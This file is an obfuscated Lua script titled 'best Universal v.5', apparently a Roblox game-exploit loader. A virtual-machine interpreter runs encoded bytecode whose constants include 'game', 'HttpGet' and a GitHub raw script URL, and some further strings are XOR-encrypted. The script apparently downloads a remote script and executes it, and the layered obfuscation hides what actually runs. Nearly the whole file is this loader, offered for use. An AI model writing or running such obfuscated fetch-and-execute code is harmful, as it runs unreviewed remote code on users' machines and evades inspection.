--[[

best Universal v.5
obfuscated because not leaking source code

--]]
local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v83=0;while true do if (v83==0) then v19=v0(v3(v30,1,1));return "";end end else local v84=0;local v85;while true do if (v84==0) then v85=v2(v0(v30,16));if v19 then local v98=v5(v85,v19);v19=nil;return v98;else return v85;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v86=(v31/((5 -(880 -(282 + 595)))^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (1638 -(1523 + 114)))) ;return v86-(v86%(932 -(857 + 74))) ;else local v87=(1 + 1)^(v32-(569 -(367 + 201))) ;return (((v31%(v87 + v87))>=v87) and (928 -(214 + 713))) or (0 + 0) ;end end local function v21() local v34=0 + 0 ;local v35;while true do if (v34==((4 -3) -0)) then return v35;end if (v34==(1065 -(68 + 997))) then v35=v1(v16,v18,v18);v18=v18 + 1 ;v34=1271 -(226 + 1044) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + (119 -(32 + 85)) ;return (v37 * 256) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (960 -(892 + 65)) );v18=v18 + 4 ;return (v41 * 16777216) + (v40 * (156337 -90801)) + (v39 * (472 -216)) + v38 ;end local function v24() local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(350 -(87 + 93 + 170))) then v43=v23();v44=v23();v42=181 -(67 + 113) ;end if (v42==(3 + 0)) then if (v47==(18 -(10 + 8))) then if (v46==(885 -(261 + 624))) then return v48 * ((0 -0) -0) ;else v47=1 + 0 ;v45=0 -0 ;end elseif (v47==2047) then return ((v46==(0 + 0)) and (v48 * ((953 -(802 + 150))/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-((2541 -(1020 + 60)) -(145 + 293)) ) * (v45 + (v46/((5 -3)^(93 -41)))) ;end if (v42==(2 + 0)) then v47=v20(v44,1018 -(915 + 82) ,87 -56 );v48=((v20(v44,19 + 13 )==(773 -(201 + 571))) and  -(1 -0)) or (1188 -(1069 + 118)) ;v42=6 -3 ;end if (v42==(3 -2)) then v45=(1424 -(630 + 793)) -0 ;v46=(v20(v44,1 + 0 ,(2978 -2099) -(814 + 45) ) * ((4 -(9 -7))^(56 -24))) + v43 ;v42=2 + 0 ;end end end local function v25(v49) local v50;if  not v49 then v49=v23();if (v49==(0 + 0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -1 );v18=v18 + v49 ;local v51={};for v66=1748 -(760 + 987) , #v50 do v51[v66]=v2(v1(v3(v50,v66,v66)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 1941 -(550 + 1391) ;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();while true do local v68=(function() return 0;end)();while true do if (v68~=0) then else local v90=(function() return 0;end)();while true do if ((0 -0)==v90) then if ((0 -0)==v52) then v53=(function() return function(v109,v110,v111) local v112=(function() return 0;end)();while true do if (v112==(1784 -(599 + 1185))) then v109[v110-#"!" ]=(function() return v111();end)();return v109,v110,v111;end end end;end)();v54=(function() return {};end)();v55=(function() return {};end)();v52=(function() return 1 + 0 ;end)();end if (1==v52) then local v108=(function() return 0 + 0 ;end)();while true do if (v108==(574 -(507 + 67))) then v56=(function() return {};end)();v57=(function() return {v54,v55,nil,v56};end)();v108=(function() return 1 + 0 ;end)();end if (v108==1) then v58=(function() return v23();end)();v52=(function() return 4 -2 ;end)();break;end end end v90=(function() return 1;end)();end if (v90==(3 -2)) then v68=(function() return 868 -(550 + 317) ;end)();break;end end end if (v68==1) then if (v52==(3 -0)) then for v99= #"|",v23() do local v100=(function() return 0 -0 ;end)();local v101=(function() return;end)();while true do if ((0 -0)~=v100) then else v101=(function() return v21();end)();if (v20(v101, #"]", #"<")==0) then local v113=(function() return 285 -(134 + 151) ;end)();local v114=(function() return;end)();local v115=(function() return;end)();local v116=(function() return;end)();while true do if (v113~=(1667 -(970 + 695))) then else if (v20(v115, #"[", #"{")== #"{") then v116[3 -1 ]=(function() return v59[v116[2]];end)();end if (v20(v115,2,1992 -(582 + 1408) )~= #",") then else v116[ #"nil"]=(function() return v59[v116[ #"-19"]];end)();end v113=(function() return 10 -7 ;end)();end if (v113==(1 -0)) then v116=(function() return {v22(),v22(),nil,nil};end)();if (v114==(1824 -(1195 + 629))) then local v217=(function() return 0 -0 ;end)();local v218=(function() return;end)();while true do if (v217~=(241 -(187 + 54))) then else v218=(function() return 0;end)();while true do if (v218~=0) then else v116[ #"xnx"]=(function() return v22();end)();v116[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v114== #" ") then v116[ #"gha"]=(function() return v23();end)();elseif (v114==2) then v116[ #"nil"]=(function() return v23() -(2^16) ;end)();elseif (v114~= #"xnx") then else local v371=(function() return 780 -(162 + 618) ;end)();local v372=(function() return;end)();while true do if (v371==0) then v372=(function() return 0 + 0 ;end)();while true do if (v372==(0 + 0)) then v116[ #"nil"]=(function() return v23() -((3 -1)^(26 -10)) ;end)();v116[ #"0836"]=(function() return v22();end)();break;end end break;end end end v113=(function() return 1 + 1 ;end)();end if (v113==(1639 -(1373 + 263))) then if (v20(v115, #"xnx", #"asd")== #" ") then v116[ #"http"]=(function() return v59[v116[ #"asd1"]];end)();end v54[v99]=(function() return v116;end)();break;end if (v113==(1000 -(451 + 549))) then local v121=(function() return 0 + 0 ;end)();while true do if (v121==(1 -0)) then v113=(function() return 1;end)();break;end if (v121~=(0 -0)) then else local v287=(function() return 0;end)();while true do if (v287==(1384 -(746 + 638))) then v114=(function() return v20(v101,1 + 1 , #"xxx");end)();v115=(function() return v20(v101, #"asd1",8 -2 );end)();v287=(function() return 1;end)();end if (v287~=1) then else v121=(function() return 1;end)();break;end end end end end end end break;end end end for v102= #"~",v23() do v55,v102,v28=(function() return v53(v55,v102,v28);end)();end return v57;end if (v52==(343 -(218 + 123))) then v59=(function() return {};end)();for v103= #" ",v58 do local v104=(function() return 1581 -(1535 + 46) ;end)();local v105=(function() return;end)();local v106=(function() return;end)();local v107=(function() return;end)();while true do if (v104~=0) then else v105=(function() return 0 + 0 ;end)();v106=(function() return nil;end)();v104=(function() return 1 + 0 ;end)();end if (v104==(561 -(306 + 254))) then v107=(function() return nil;end)();while true do if (0==v105) then local v117=(function() return 0 + 0 ;end)();while true do if ((1 -0)~=v117) then else v105=(function() return 1468 -(899 + 568) ;end)();break;end if (v117==(0 + 0)) then v106=(function() return v21();end)();v107=(function() return nil;end)();v117=(function() return 1;end)();end end end if (v105==(2 -1)) then if (v106== #"|") then v107=(function() return v21()~=0 ;end)();elseif (v106==(605 -(268 + 335))) then v107=(function() return v24();end)();elseif (v106== #"xxx") then v107=(function() return v25();end)();end v59[v103]=(function() return v107;end)();break;end end break;end end end v57[ #"91("]=(function() return v21();end)();v52=(function() return 293 -(60 + 230) ;end)();end break;end end end end local function v29(v60,v61,v62) local v63=v60[573 -(426 + 146) ];local v64=v60[1 + 1 ];local v65=v60[1459 -(282 + 1056 + 118) ];return function(...) local v69=v63;local v70=v64;local v71=v65;local v72=v27;local v73=812 -(569 + 242) ;local v74= -(2 -(1 + 0));local v75={};local v76={...};local v77=v12("#",...) -(1025 -(706 + 318)) ;local v78={};local v79={};for v88=0,v77 do if ((v88>=v71) or (1228>2702)) then v75[v88-v71 ]=v76[v88 + 1 ];else v79[v88]=v76[v88 + (1252 -(721 + 530)) ];end end local v80=(v77-v71) + (1272 -(945 + 326)) ;local v81;local v82;while true do local v89=0 -0 ;while true do if (v89==(0 + 0)) then v81=v69[v73];v82=v81[701 -(271 + 429) ];v89=1 + 0 ;end if (1==v89) then if (v82<=((1844 -(192 + 134)) -((2684 -(316 + 960)) + 92))) then if ((825==825) and (v82<=(1094 -(461 + 625)))) then if (v82<=(1291 -(993 + 295))) then if ((v82<=(1 + 0)) or (3455==177)) then if ((v82>0) or (243==4615)) then v73=v81[1174 -(233 + 185 + 753) ];else v79[v81[1 + 1 ]]=v61[v81[1 + 0 + 2 ]];end elseif (v82==(1 + 1)) then v79[v81[1 + 1 ]]=v62[v81[532 -(406 + 123) ]];else v79[v81[1771 -(1749 + 20) ]]={};v73=v73 + 1 ;v81=v69[v73];v79[v81[1 + 1 ]]=v62[v81[3 + 0 ]];v73=v73 + (1323 -((4774 -3525) + 73)) ;v81=v69[v73];v79[v81[1 + 1 ]]=v79[v81[1148 -(466 + 679) ]][v81[9 -5 ]];v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[1902 -(106 + 1794) ]]=v62[v81[1 + 2 ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[5 -3 ]]=v79[v81[7 -4 ]][v81[118 -(4 + 110) ]];v73=v73 + 1 ;v81=v69[v73];v79[v81[586 -(57 + 527) ]]=v62[v81[1430 -((592 -(83 + 468)) + 1386) ]];v73=v73 + (104 -(17 + 86)) ;v81=v69[v73];v79[v81[2]]=v79[v81[3]][v81[3 + 1 ]];v73=v73 + (1 -0) ;v81=v69[v73];v79[v81[5 -3 ]]=v62[v81[169 -(122 + 44) ]];v73=v73 + 1 ;v81=v69[v73];if  not v79[v81[2 -0 ]] then v73=v73 + 1 ;else v73=v81[(1815 -(1202 + 604)) -6 ];end end elseif (v82<=(5 + 0)) then if (v82==(1 + 3)) then local v141=v81[2];v79[v141]=v79[v141](v13(v79,v141 + (4 -3) ,v74));else local v143=0 -0 ;local v144;local v145;local v146;while true do if (v143==(66 -(30 + 35))) then v146=v79[v144] + v145 ;v79[v144]=v146;v143=2 + 0 ;end if (v143==(1259 -((1735 -692) + 214))) then if (v145>0) then if ((271<1117) and (v146<=v79[v144 + (3 -2) ])) then v73=v81[1215 -(323 + 889) ];v79[v144 + 3 ]=v146;end elseif (v146>=v79[v144 + 1 ]) then v73=v81[7 -4 ];v79[v144 + (8 -5) ]=v146;end break;end if (v143==(580 -((686 -(45 + 280)) + 219))) then v144=v81[2];v145=v79[v144 + (322 -(53 + 267)) ];v143=1 + 0 ;end end end elseif (v82<=6) then v79[v81[415 -(15 + 385 + 13) ]]=v79[v81[(861 + 124) -(18 + 352 + 612) ]]%v79[v81[14 -10 ]] ;elseif (v82==(5 + 2)) then for v291=v81[2],v81[2 + 1 ] do v79[v291]=nil;end else local v221=850 -(12 + 8 + 830) ;local v222;while true do if (v221==(0 + 0)) then v222=v81[128 -(116 + 2 + 8) ];do return v13(v79,v222,v74);end break;end end end elseif (v82<=(1 + 12)) then if (v82<=(748 -((1003 -461) + 196))) then if ((2739==2739) and (v82==9)) then local v148;local v149;v79[v81[2]]=v62[v81[3]];v73=v73 + 1 ;v81=v69[v73];v149=v81[2];v148=v79[v81[6 -(1914 -(340 + 1571)) ]];v79[v149 + 1 + 0 ]=v148;v79[v149]=v148[v81[3 + 1 ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[4 -2 ]]=v79[v81[7 -4 ]];v73=v73 + (1552 -(1126 + 168 + 257)) ;v81=v69[v73];v149=v81[407 -(118 + 287) ];v79[v149]=v79[v149](v13(v79,v149 + (3 -2) ,v81[3]));v73=v73 + ((2894 -(1733 + 39)) -(118 + 1003)) ;v81=v69[v73];v79[v81[5 -3 ]]=v79[v81[380 -(142 + 235) ]];v73=v73 + (4 -3) ;v81=v69[v73];v79[v81[1 + 1 ]]=v81[980 -(553 + (1165 -741)) ];v73=v73 + (1 -0) ;v81=v69[v73];v73=v81[3 + 0 ];elseif (v79[v81[2 + 0 ]]==v81[3 + 1 ]) then v73=v73 + 1 + 0 ;else v73=v81[(1036 -(125 + 909)) + 1 ];end elseif (v82<=(23 -12)) then v79[v81[2]]= #v79[v81[7 -4 ]];elseif (v82>(26 -14)) then local v224=v81[1950 -(1096 + 852) ];v79[v224]=v79[v224](v13(v79,v224 + 1 + 0 ,v81[(7 + 7) -11 ]));else local v226=v81[2];local v227=v79[v81[3]];v79[v226 + (754 -((340 -101) + 514)) ]=v227;v79[v226]=v227[v81[2 + 2 ]];end elseif ((v82<=(1344 -(797 + 532))) or (23==1134)) then if (v82>(11 + 3)) then v79[v81[1 + 1 ]]();else local v167=v81[4 -2 ];local v168,v169=v72(v79[v167](v13(v79,v167 + (1203 -(373 + 805 + 24)) ,v81[734 -(476 + 255) ])));v74=(v169 + v167) -(1131 -(369 + 761)) ;local v170=0 + 0 ;for v197=v167,v74 do v170=v170 + (1 -0) ;v79[v197]=v168[v170];end end elseif (v82<=(29 -13)) then v79[v81[(752 -(409 + 103)) -(64 + 174) ]]=v79[v81[1 + 2 ]]%v81[5 -1 ] ;elseif ((v82==17) or (2693>=4111)) then v79[v81[(574 -(46 + 190)) -(144 + 192) ]]=v79[v81[219 -((137 -(51 + 44)) + 174) ]];else local v233=0 + 0 ;local v234;while true do if ((v233==(0 + 0 + 0)) or (4316<=2146)) then v234=v81[1 + 1 ];v79[v234]=v79[v234](v79[v234 + (1505 -(363 + 1141)) ]);break;end end end elseif (v82<=((2924 -(1114 + 203)) -(1183 + 397))) then if ((v82<=(66 -44)) or (3546<=2809)) then if (v82<=(15 + (731 -(228 + 498)))) then if ((4904>2166) and (v82>19)) then v79[v81[2]][v81[3 + 0 ]]=v79[v81[(429 + 1550) -(1913 + 62) ]];else local v174=0;local v175;while true do if (v174==(2 + 0)) then v73=v73 + (2 -1) ;v81=v69[v73];v175=v81[(1070 + 865) -(565 + 1368) ];v79[v175]=v79[v175](v79[v175 + (3 -2) ]);v174=3;end if (v174==4) then v81=v69[v73];v79[v81[2]]=v79[v81[1664 -(1477 + (847 -(174 + 489))) ]];v73=v73 + 1 ;v81=v69[v73];v174=5;end if ((109>=90) and (v174==(3 -0))) then v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[2]]=v79[v81[859 -(564 + 292) ]];v73=v73 + 1 ;v174=6 -2 ;end if ((4978>2905) and (v174==(2 -1))) then v79[v81[2]]=v79[v81[3]][v79[v81[308 -(244 + 60) ]]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[478 -(41 + 435) ]]=v79[v81[1004 -(938 + 63) ]];v174=2;end if (v174==(4 + 1)) then v79[v81[1127 -(936 + (492 -303)) ]]();v73=v73 + 1 + 0 ;v81=v69[v73];v73=v81[1616 -(1565 + 48) ];break;end if (v174==(0 + 0)) then v175=nil;v79[v81[(3045 -(830 + 1075)) -(782 + 356) ]]=v79[v81[(794 -(303 + 221)) -(176 + 91) ]][v81[10 -(1275 -(231 + 1038)) ]];v73=v73 + (1 -0) ;v81=v69[v73];v174=1093 -(813 + 162 + 117) ;end end end elseif ((v82==(1896 -(157 + 1718))) or (3026<=2280)) then v79[v81[2 + 0 ]]=v79[v81[3]][v79[v81[(1176 -(171 + 991)) -10 ]]];else v79[v81[6 -4 ]]=v79[v81[1021 -(697 + 321) ]] + v81[10 -6 ] ;end elseif (v82<=(50 -26)) then if (v82==(52 -29)) then v79[v81[1 + 1 ]]={};else v79[v81[3 -1 ]]=v81[3] + v79[v81[(41 -31) -6 ]] ;end elseif (v82<=(1252 -(322 + 905))) then local v181=v70[v81[614 -(602 + 9) ]];local v182;local v183={};v182=v10({},{__index=function(v200,v201) local v202=0;local v203;while true do if (v202==0) then v203=v183[v201];return v203[1190 -(449 + 740) ][v203[874 -(826 + 46) ]];end end end,__newindex=function(v204,v205,v206) local v207=v183[v205];v207[948 -(245 + 702) ][v207[6 -4 ]]=v206;end});for v209=1,v81[2 + (4 -2) ] do v73=v73 + (1899 -(260 + 1638)) ;local v210=v69[v73];if (v210[441 -(382 + 58) ]==17) then v183[v209-(3 -2) ]={v79,v210[5 -2 ]};else v183[v209-(2 -1) ]={v61,v210[5 -2 ]};end v78[ #v78 + (2 -1) ]=v183;end v79[v81[6 -4 ]]=v29(v181,v182,v62);elseif (v82==(3 + 23)) then v79[v81[2]]=v81[3];else local v237;local v238,v239;local v240;v79[v81[1692 -(1121 + 569) ]]=v79[v81[217 -(22 + 192) ]];v73=v73 + (684 -((1393 -910) + 200)) ;v81=v69[v73];v79[v81[2]]=v61[v81[1466 -(1404 + 59) ]];v73=v73 + (2 -(1 -0)) ;v81=v69[v73];v79[v81[2 -(0 -0) ]]=v61[v81[768 -(468 + 297) ]];v73=v73 + (563 -(334 + 228)) ;v81=v69[v73];v79[v81[6 -4 ]]=v61[v81[3]];v73=v73 + (2 -(1249 -(111 + 1137))) ;v81=v69[v73];v79[v81[2 -0 ]]=v61[v81[1 + 2 ]];v73=v73 + ((395 -(91 + 67)) -(141 + 95)) ;v81=v69[v73];v79[v81[2 + 0 ]]=v79[v81[7 -4 ]];v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[1 + 1 ]]=v79[v81[8 -5 ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[5 -3 ]]=v79[v81[2 + 1 ]] + v81[5 -1 ] ;v73=v73 + 1 + 0 + 0 ;v81=v69[v73];v240=v81[2];v238,v239=v72(v79[v240](v13(v79,v240 + (164 -((615 -(423 + 100)) + 1 + 70)) ,v81[2 + 1 ])));v74=(v239 + v240) -1 ;v237=(0 -0) -0 ;for v314=v240,v74 do local v315=765 -(574 + 191) ;while true do if ((v315==(0 + 0 + 0)) or (1653<=1108)) then v237=v237 + (772 -(326 + 445)) ;v79[v314]=v238[v237];break;end end end v73=v73 + 1 ;v81=v69[v73];v240=v81[4 -(8 -6) ];v79[v240]=v79[v240](v13(v79,v240 + 1 + 0 ,v74));v73=v73 + (850 -(254 + 595)) ;v81=v69[v73];v79[v81[2]]=v61[v81[3]];v73=v73 + (127 -(55 + 71)) ;v81=v69[v73];v79[v81[2 -0 ]]=v61[v81[3]];v73=v73 + (1791 -(573 + 1217)) ;v81=v69[v73];v79[v81[2]]=v79[v81[8 -5 ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[2 -0 ]]= #v79[v81[3]];v73=v73 + (940 -(714 + 225)) ;v81=v69[v73];v79[v81[5 -3 ]]=v79[v81[3 -0 ]]%v79[v81[4]] ;v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[2]]=v81[(6 -3) -0 ] + v79[v81[810 -(118 + 688) ]] ;v73=v73 + 1 ;v81=v69[v73];v79[v81[50 -(25 + 23) ]]= #v79[v81[(2 -1) + (713 -(530 + 181)) ]];v73=v73 + (1887 -(927 + 959)) ;v81=v69[v73];v79[v81[2]]=v79[v81[10 -7 ]]%v79[v81[4]] ;v73=v73 + (733 -(16 + 716)) ;v81=v69[v73];v79[v81[3 -(882 -(614 + 267)) ]]=v81[100 -(11 + (118 -(19 + 13))) ] + v79[v81[4]] ;v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[2]]=v79[v81[3]] + v81[289 -(175 + 110) ] ;v73=v73 + ((2 -0) -1) ;v81=v69[v73];v240=v81[9 -7 ];v238,v239=v72(v79[v240](v13(v79,v240 + (1797 -(503 + (3012 -1719))) ,v81[3])));v74=(v239 + v240) -1 ;v237=0;for v316=v240,v74 do v237=v237 + (2 -1) ;v79[v316]=v238[v237];end v73=v73 + 1 + 0 ;v81=v69[v73];v240=v81[1063 -(810 + 251) ];v238,v239=v72(v79[v240](v13(v79,v240 + 1 + 0 ,v74)));v74=(v239 + v240) -(1 + (0 -0)) ;v237=0 + 0 ;for v319=v240,v74 do local v320=0 + (0 -0) ;while true do if (v320==(533 -(43 + 490))) then v237=v237 + (734 -(711 + 22)) ;v79[v319]=v238[v237];break;end end end v73=v73 + (3 -2) ;v81=v69[v73];v240=v81[861 -(240 + 619) ];v79[v240]=v79[v240](v13(v79,v240 + 1 + 0 ,v74));v73=v73 + (1 -0) ;v81=v69[v73];v79[v81[1 + 1 ]]=v79[v81[3]]%v81[7 -3 ] ;v73=v73 + (1745 -(1344 + 400)) ;v81=v69[v73];v240=v81[407 -(255 + 150) ];v238,v239=v72(v79[v240](v79[v240 + 1 + 0 ]));v74=(v239 + v240) -(1 + 0) ;v237=0 -0 ;for v321=v240,v74 do local v322=0 -0 ;while true do if (v322==0) then v237=v237 + 1 ;v79[v321]=v238[v237];break;end end end v73=v73 + (1740 -(404 + 1335)) ;v81=v69[v73];v240=v81[408 -(183 + 223) ];v79[v240](v13(v79,v240 + 1 ,v74));end elseif (v82<=((1850 -(1293 + 519)) -6)) then if (v82<=(20 + 9)) then if (v82==(11 + (34 -17))) then local v185=v81[339 -(10 + 327) ];do return v79[v185](v13(v79,v185 + 1 ,v81[3 + 0 ]));end else v79[v81[340 -(118 + 220) ]]=v79[v81[1 + 2 ]][v81[4]];end elseif ((2909>2609) and (v82<=(479 -(108 + 341)))) then if  not v79[v81[1 + 1 ]] then v73=v73 + (4 -(7 -4)) ;else v73=v81[3];end elseif ((757>194) and (v82>(1524 -(711 + 782)))) then local v268=v81[3 -1 ];v79[v268](v13(v79,v268 + (470 -(270 + 199)) ,v74));else local v269=0 + 0 ;local v270;local v271;local v272;local v273;while true do if (v269==(1819 -((1109 -529) + 1239))) then v270=v81[2];v271,v272=v72(v79[v270](v79[v270 + (2 -1) ]));v269=1 + 0 ;end if ((v269==(1 + 1)) or (31>=1398)) then for v359=v270,v74 do local v360=(0 -0) + 0 ;while true do if ((0 -0)==v360) then v273=v273 + 1 + 0 ;v79[v359]=v271[v273];break;end end end break;end if ((3196<=4872) and (v269==(1168 -(645 + 522)))) then v74=(v272 + v270) -(1791 -(1010 + 780)) ;v273=0 + 0 ;v269=9 -7 ;end end end elseif (v82<=(99 -65)) then if (v82==33) then local v188=v81[2];local v189=v79[v188];local v190=v79[v188 + (1838 -((2461 -1416) + 791)) ];if ((3326==3326) and (v190>(0 -0))) then if (v189>v79[v188 + (1 -0) ]) then v73=v81[508 -(351 + 154) ];else v79[v188 + 3 ]=v189;end elseif (v189<v79[v188 + (1575 -(1281 + 293)) ]) then v73=v81[269 -(15 + 13 + 238) ];else v79[v188 + 3 ]=v189;end else local v191=v81[4 -2 ];local v192,v193=v72(v79[v191](v13(v79,v191 + 1 ,v74)));v74=(v193 + v191) -(1560 -(1381 + 178)) ;local v194=0;for v212=v191,v74 do v194=v194 + 1 + 0 ;v79[v212]=v192[v194];end end elseif (v82<=(29 + 6)) then local v195=0 + 0 ;local v196;while true do if ((1433<=3878) and ((0 -0)==v195)) then v196=nil;v79[v81[2]]=v79[v81[2 + 1 ]];v73=v73 + ((97 + 374) -(381 + 89)) ;v81=v69[v73];v195=1;end if ((v195==((9 -5) + 0)) or (1583==1735)) then v81=v69[v73];v79[v81[2 + 0 ]]=v81[(1 + 3) -1 ];v73=v73 + (1157 -(1074 + 82)) ;v81=v69[v73];v195=10 -5 ;end if (((1787 -(214 + 1570))==v195) or (2981==2350)) then v73=v73 + (1456 -(990 + 465)) ;v81=v69[v73];v79[v81[1 + 1 ]][v81[1 + 1 + 1 ]]=v79[v81[4 + 0 ]];v73=v73 + ((2 + 1) -2) ;v195=1730 -(1668 + 58) ;end if ((628 -(512 + 114))==v195) then v73=v73 + (1097 -(709 + 387)) ;v81=v69[v73];v196=v81[2];v79[v196]=v79[v196](v13(v79,v196 + (2 -1) ,v81[(1863 -(673 + 1185)) -2 ]));v195=3;end if ((3 -2)==v195) then v79[v81[2]]=v81[3];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[1 + (2 -1) ]]=v81[3 + (0 -0) ];v195=(9 -3) -4 ;end if ((v195==((1430 + 569) -(109 + 1885))) or (4466<=493)) then for v346=v81[1471 -(1269 + 150 + 50) ],v81[5 -2 ] do v79[v346]=nil;end break;end end elseif (v82==(851 -(98 + 717))) then do return;end else local v274;local v275;local v276;v79[v81[828 -(802 + 24) ]]={};v73=v73 + (1 -0) ;v81=v69[v73];v79[v81[2 -0 ]]=v81[1 + 2 ];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[1 + 1 ]]= #v79[v81[1 + 2 ]];v73=v73 + 1 ;v81=v69[v73];v79[v81[5 -3 ]]=v81[9 -6 ];v73=v73 + 1 ;v81=v69[v73];v276=v81[1 + 1 ];v275=v79[v276];v274=v79[v276 + 1 + 1 ];if (v274>(0 + 0)) then if (v275>v79[v276 + 1 + (0 -0) ]) then v73=v81[2 + 1 ];else v79[v276 + ((353 + 1083) -(797 + 636)) ]=v275;end elseif (v275<v79[v276 + (4 -3) ]) then v73=v81[1622 -(1427 + 192) ];else v79[v276 + 2 + 1 ]=v275;end end v73=v73 + (2 -(1 -0)) ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!123Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274028Q00030A3Q0033F322C939D1C1CE31FB03083Q00A75F9C43AD4AA5B3026Q00F03F03023Q005F47033B3Q00682Q7470733A2Q2F6769746875622E636F6D2F46752Q7279426F7959542F736372697074696E672F7261772F6D61696E2F7363726970742E6C756103043Q0067616D6503073Q00482Q747047657400344Q00037Q00122Q000100013Q00202Q00010001000200122Q000200013Q00202Q00020002000300122Q000300013Q00202Q00030003000400122Q000400053Q00062Q0004000B000100010004013Q000B0001001202000400063Q00201D000500040007001202000600083Q00201D000600060009001202000700083Q00201D00070007000A00061900083Q000100062Q00113Q00074Q00113Q00014Q00113Q00054Q00113Q00024Q00113Q00034Q00113Q00064Q0023000900083Q00122Q000A000C3Q00122Q000B000D6Q0009000B000200104Q000B000900122Q0009000B6Q000A000C3Q00260A000900290001000E0004013Q00290001001202000D000F3Q002013000E3Q000B4Q000D000D000E4Q000E000B6Q000D000200024Q000C000D6Q000D000C6Q000D0001000100044Q0033000100260A0009001E0001000B0004013Q001E000100121A000A00103Q001209000D00113Q00202Q000D000D00124Q000F000A6Q000D000F00024Q000B000D3Q00122Q0009000E3Q00044Q001E00012Q00243Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q002500025Q00122Q000300016Q00045Q00122Q000500013Q00042Q0003002100014Q00076Q001B000800026Q000900016Q000A00026Q000B00036Q000C00046Q000D8Q000E00063Q00202Q000F000600014Q000C000F6Q000B3Q00024Q000C00036Q000D00046Q000E00016Q000F00016Q000F0006000F00102Q000F0001000F4Q001000016Q00100006001000102Q00100001001000202Q0010001000014Q000D00106Q000C8Q000A3Q000200202Q000A000A00024Q0009000A6Q00073Q00010004050003000500014Q000300054Q0011000400024Q001C000300044Q000800036Q00243Q00017Q00",v9(),...);
